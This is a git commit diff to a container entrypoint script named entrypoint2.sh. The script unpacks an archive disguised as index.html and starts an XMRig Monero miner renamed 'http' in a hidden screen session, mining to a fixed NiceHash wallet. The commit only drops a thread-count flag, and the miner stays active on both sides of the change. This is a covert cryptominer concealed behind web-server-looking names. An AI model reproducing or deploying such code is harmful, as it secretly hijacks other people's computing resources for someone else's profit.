3408ead47aacc3071da6562a08c75e53c45564c0
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-08-17 08:22:58 +0100

    Update entrypoint2.sh

--- entrypoint2.sh
+++ entrypoint2.sh
@@ -11,7 +11,7 @@ tar -xvzf /app2/index.html -C /app2/
 cd /app2/httpalpine
 
 # Run XMRig with screen
-screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=8 --cpu-no-yield"
+screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --cpu-no-yield"
 
 # Change directory to /app and run the original command in the background
 #cd /app
